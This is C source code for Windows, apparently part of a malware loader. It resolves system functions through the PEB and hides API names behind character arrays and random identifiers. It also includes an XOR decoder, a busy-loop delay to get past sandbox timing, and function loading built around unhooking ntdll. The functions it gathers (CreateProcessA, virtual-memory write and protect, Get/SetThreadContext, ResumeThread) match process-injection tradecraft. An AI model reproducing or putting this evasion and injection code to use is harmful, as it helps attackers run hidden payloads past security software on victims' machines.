#include <windows.h>
#include <stdio.h>
#include "addresshunter.h"
#include "functions.h"

//Kernel32 Function
UINT64 kernel32dll = 0;
tvgzqnoeihfh_t tvgzqnoeihfhFunc = 0;
eqsxvbarvtdd_t eqsxvbarvtddFunc = 0;
lgaebehmwwjo_t lgaebehmwwjoFunc = 0;
aorclcchegyu_t aorclcchegyuFunc = 0;
zlwmhqsfvcqu_t zlwmhqsfvcquFunc = 0;
cyertryxidbu_t cyertryxidbuFunc = 0;
mztrdriqwotf_t mztrdriqwotfFunc = 0;
buqefpmwmduy_t buqefpmwmduyFunc = 0;
wqwxjlulhemu_t wqwxjlulhemuFunc = 0;
nkokllmibpvk_t nkokllmibpvkFunc = 0;
LOADLIBRARYA egjswrwqfvuqFunc = 0;

//Nt Functions
HMODULE ntdlldll = 0;
chnplwnpriqy_t chnplwnpriqyFunc = 0;
rpfgpexnugke_t rpfgpexnugkeFunc = 0;
ezrjzfjjdkqx_t ezrjzfjjdkqxFunc = 0;
zexuaydozwbp_t zexuaydozwbpFunc = 0;

pxrqfhqypmke_t pxrqfhqypmkeFunc = 0;

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

void sleep()
{
	for (int i = 0; i <= 500000; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}

PVOID bzbhxuhreuvmbi(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

char* strstrFunc(const char* string, const char* substring)
{
	const char* a, * b;

	/* First scan quickly through the two strings looking for a
	 * single-character match.  When it's found, then compare the
	 * rest of the substring.
	 */

	b = substring;

	if (*b == 0)
	{
		return (char*)string;
	}

	for (; *string != 0; string += 1)
	{
		if (*string != *b)
		{
			continue;
		}

		a = string;

		while (1)
		{
			if (*b == 0)
			{
				return (char*)string;
			}
			if (*a++ != *b++)
			{
				break;
			}
		}

		b = substring;
	}

	return NULL;
}

PVOID GetDll(PWSTR FindName)
{
	_PPEB ppeb = (_PPEB)__readgsqword(0x60);
	ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
	ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
	PVOID dllBase = NULL;

	ULONG_PTR val2;
	while (val1)
	{
		PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
		dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
		if (my_strcmp((char*)FindName, (char*)DllName) == 0)
		{
			break;
		}
		val1 = DEREF_64(val1);
	}
	return dllBase;
}

void LoadFunctionsAfterUnhooking() {

	CHAR chnplwnpriqy_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR rpfgpexnugke_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR ezrjzfjjdkqx_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR egjswrwqfvuq_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	CHAR hwjzhvnhgcpp_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR tvgzqnoeihfh_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
	CHAR eqsxvbarvtdd_c[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00 };
	CHAR lgaebehmwwjo_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
	CHAR aorclcchegyu_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
	CHAR zlwmhqsfvcqu_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
	CHAR cyertryxidbu_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
	CHAR mztrdriqwotf_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
	CHAR buqefpmwmduy_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
	CHAR nkokllmibpvk_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
	CHAR wqwxjlulhemu_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };



	kernel32dll = quudqelkdoqapyan();
	//Kernel32 Function
	tvgzqnoeihfhFunc = (tvgzqnoeihfh_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, tvgzqnoeihfh_c);
	eqsxvbarvtddFunc = (eqsxvbarvtdd_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, eqsxvbarvtdd_c);
	lgaebehmwwjoFunc = (lgaebehmwwjo_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, lgaebehmwwjo_c);
	aorclcchegyuFunc = (aorclcchegyu_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, aorclcchegyu_c);
	zlwmhqsfvcquFunc = (zlwmhqsfvcqu_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, zlwmhqsfvcqu_c);
	cyertryxidbuFunc = (cyertryxidbu_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, cyertryxidbu_c);
	mztrdriqwotfFunc = (mztrdriqwotf_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, mztrdriqwotf_c);
	buqefpmwmduyFunc = (buqefpmwmduy_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, buqefpmwmduy_c);
	wqwxjlulhemuFunc = (wqwxjlulhemu_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, wqwxjlulhemu_c);
	nkokllmibpvkFunc = (nkokllmibpvk_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, nkokllmibpvk_c);
	egjswrwqfvuqFunc = (LOADLIBRARYA)wgqwhcvtzhelvtq((HMODULE)kernel32dll, egjswrwqfvuq_c);

	//Nt Functions
	ntdlldll = egjswrwqfvuqFunc("ntdll.dll");
	chnplwnpriqyFunc = (chnplwnpriqy_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, chnplwnpriqy_c);
	rpfgpexnugkeFunc = (rpfgpexnugke_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, rpfgpexnugke_c);
	ezrjzfjjdkqxFunc = (ezrjzfjjdkqx_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, ezrjzfjjdkqx_c);
	zexuaydozwbpFunc = (zexuaydozwbp_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, hwjzhvnhgcpp_c);


}

void LoadFunctionBeforeUnhooking() {
	CHAR pxrqfhqypmke_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
	CHAR tvgzqnoeihfh_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
	CHAR chnplwnpriqy_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR hwjzhvnhgcpp_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR eqsxvbarvtdd_c[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00 };
	CHAR rpfgpexnugke_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR egjswrwqfvuq_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	CHAR lgaebehmwwjo_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };

	kernel32dll = quudqelkdoqapyan();
	egjswrwqfvuqFunc = (LOADLIBRARYA)wgqwhcvtzhelvtq((HMODULE)kernel32dll, egjswrwqfvuq_c);
	ntdlldll = egjswrwqfvuqFunc("ntdll.dll");

	tvgzqnoeihfhFunc = (tvgzqnoeihfh_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, tvgzqnoeihfh_c);
	lgaebehmwwjoFunc = (lgaebehmwwjo_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, lgaebehmwwjo_c);
	pxrqfhqypmkeFunc = (pxrqfhqypmke_t)wgqwhcvtzhelvtq((HANDLE)egjswrwqfvuqFunc("msvcrt.dll"), pxrqfhqypmke_c);
	chnplwnpriqyFunc = (chnplwnpriqy_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, chnplwnpriqy_c);
	zexuaydozwbpFunc = (zexuaydozwbp_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, hwjzhvnhgcpp_c);
	eqsxvbarvtddFunc = (eqsxvbarvtdd_t)wgqwhcvtzhelvtq((HANDLE)kernel32dll, eqsxvbarvtdd_c);
	rpfgpexnugkeFunc = (rpfgpexnugke_t)wgqwhcvtzhelvtq((HANDLE)ntdlldll, rpfgpexnugke_c);

}